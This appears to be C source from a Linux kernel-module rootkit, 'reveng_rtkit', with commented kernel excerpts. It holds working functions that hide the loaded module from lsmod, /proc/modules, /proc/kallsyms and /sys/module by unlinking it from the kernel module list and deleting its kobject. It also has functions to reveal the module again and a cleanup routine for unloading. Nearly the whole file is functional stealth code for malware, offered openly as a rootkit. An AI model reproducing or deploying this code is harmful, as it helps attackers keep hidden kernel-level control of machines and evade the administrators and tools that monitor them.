#include <linux/init.h>		/* Needed for the macros */
#include <linux/module.h>	/* Needed by all modules */
#include <linux/kernel.h>	/* Needed for printing log level messages */
#include <linux/list.h>		/* macros related to linked list are defined here. Eg: list_add(), list_del(), list_entry(), etc */
#include <linux/slab.h>		/* kfree() */

// ============================================ Hiding our rootkit LKM =============================================


/*
//pwd: /lib/modules/5.11.0-49-generic/build/include/linux/types.h

struct list_head {
		struct list_head *next, *prev;
		};
*/

/*
//pwd: /lib/modules/5.11.0-49-generic/build/include/linux/module.h

struct module {
	...
	//Member of list of modules
	struct list_head list;
	...
        };
*/

/*
Every kernel module that gets loaded has a THIS_MODULE object setup for it and made available.
We can see this by looking at https://github.com/torvalds/linux/blob/729e3d091984487f7aa1ebfabfe594e5b317ed0f/include/linux/export.h#L16

Either way, THIS_MODULE gets defined as a pointer to a module.
*/

//For storing location of previous module from the "list_head" structure
static struct list_head *prev_module_in_proc_modules_lsmod;

// Flags
int is_hidden_proc = 0;
int is_hidden_sys = 0;


/* Hiding rootkit LKM from `lsmod` cmd, "/proc/modules" file path and "/proc/kallsyms" file path */
static void proc_lsmod_hide_rootkit(void)
{
	if (is_hidden_proc)
	{
		printk(KERN_INFO "[+] reveng_rtkit: Our rootkit LKM is already hidden from `lsmod` cmd, `/proc/modules` file path and `/proc/kallsyms` file path \n");
		return;
	}

	/* Here, THIS_MODULE is acting as a pointer to a "module structure".
	 * Our rootkit module will be represented by THIS_MODULE. */
	
	//prev_module_in_proc_modules_lsmod = (&THIS_MODULE->list)->prev;
	prev_module_in_proc_modules_lsmod = THIS_MODULE->list.prev;

	printk(KERN_INFO "[*] reveng_rtkit: Hiding our rootkit LKM from `lsmod` cmd, `/proc/modules` file path and `/proc/kallsyms` file path \n");

	//deleting rootkit module from list structure (=list_head structure)

	/*
	//pwd: /lib/modules/5.11.0-49-generic/build/include/linux/list.h

 	 * list_del - deletes entry from list.
	 * @entry: the element to delete from the list.
	 * Note: list_empty() on entry does not return true after this, the entry is
	 * in an undefined state.

	static inline void list_del(struct list_head *entry)
	{
        	__list_del_entry(entry);
	        entry->next = LIST_POISON1;
        	entry->prev = LIST_POISON2;
	}
	*/
	list_del(&THIS_MODULE->list);

	is_hidden_proc = 1;
}


/* Hiding rootkit LKM from "/sys/module/<THIS_MODULE>/" directory */
static void sys_module_hide_rootkit(void)
{
        if (is_hidden_sys)
        {
        	printk(KERN_INFO "[+] reveng_rtkit: Our rootkit LKM is already hidden from `/sys/module/<THIS_MODULE>/` directory \n");
                return;
        }

        /* Here, THIS_MODULE is acting as a pointer to a "module structure".
	 * Our rootkit module will be represented by THIS_MODULE. */

        printk(KERN_INFO "[*] reveng_rtkit: Hiding our rootkit LKM from `/sys/module/<THIS_MODULE>/` directory \n");

        // Explanation for taking this expression is given in the blog article.
        /* link: https://theswissbay.ch/pdf/Whitepaper/Writing%20a%20simple%20rootkit%20for%20Linux%20-%20Ormi.pdf
        page: 6, last para */
        
        
        /* pwd: /lib/modules/5.11.0-49-generic/build/include/linux/list.h
         *
	 * list_del_init - deletes entry from list and reinitialize it.
	 * @entry: the element to delete from the list.
	 *
	 *static inline void list_del_init(struct list_head *entry)
	 *{
	 *	__list_del_entry(entry);
	 *	INIT_LIST_HEAD(entry);
	 * }
	 */
        //list_del_init(&__this_module.list);
 	kobject_del(&THIS_MODULE->mkobj.kobj);
	//list_del(&THIS_MODULE->mkobj.kobj.entry);

        is_hidden_sys = 1;
}

// ============================================= Revealing our rootkit LKM ====================================

/* Revealing rootkit LKM.
   It will become visible to `lsmod` cmd, in "/proc/modules" file path and "/proc/kallsyms" file path */
static void proc_lsmod_show_rootkit(void)
{
	if (!is_hidden_proc)
	{
		printk(KERN_INFO "[*] reveng_rtkit: Our rootkit LKM is already revealed to `lsmod` cmd, in `/proc/modules` file path and `/proc/kallsyms` file path \n");
		return;
	}
	printk(KERN_INFO "[*] reveng_rtkit: Revealing our rootkit LKM to `lsmod` cmd, in `/proc/modules` file path and `/proc/kallsyms` file path \n");

	 /*
	 //pwd: /lib/modules/5.11.0-49-generic/build/include/linux/list.h

	 * list_add - add a new entry
	 * @new: new entry to be added
	 * @head: list head to add it after
	 *
	 * Insert a new entry after the specified head.
         * This is good for implementing stacks.
 
        static inline void list_add(struct list_head *new, struct list_head *head)
        {
                __list_add(new, head, head->next);
        }
        */
	list_add(&THIS_MODULE->list, prev_module_in_proc_modules_lsmod);
	
	is_hidden_proc = 0;
}


/* Revealing rootkit LKM.
   It will become visible to "/sys/module/<THIS_MODULE>/" directory */
static void sys_module_show_rootkit(void)
{
	if (!is_hidden_sys)
	{
		printk(KERN_INFO "[*] reveng_rtkit: Our rootkit LKM is already revealed to `/sys/module/<THIS_MODULE>/` directory \n");
		return;
	}

	printk(KERN_INFO "[*] reveng_rtkit: Revealing our rootkit LKM to `/sys/module/<THIS_MODULE>/` directory \n");
	/*
	kobject_add(&THIS_MODULE->mkobj.kobj);

	// extern void kobject_put(struct kobject *kobj);
	kobject_put(&THIS_MODULE->mkobj.kobj);
	*/
	is_hidden_sys = 0;
}

// ====== Avoiding errors while rmmod'ing our rootkit LKM ============

static inline void tidy(void)
{
        // Freeing 
        kfree(THIS_MODULE->notes_attrs);
	THIS_MODULE->notes_attrs = NULL;
	
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
	
	kfree(THIS_MODULE->mkobj.mp);
	THIS_MODULE->mkobj.mp = NULL;
	THIS_MODULE->modinfo_attrs->attr.name = NULL;
	
	kfree(THIS_MODULE->mkobj.drivers_dir);
	THIS_MODULE->mkobj.drivers_dir = NULL;
}

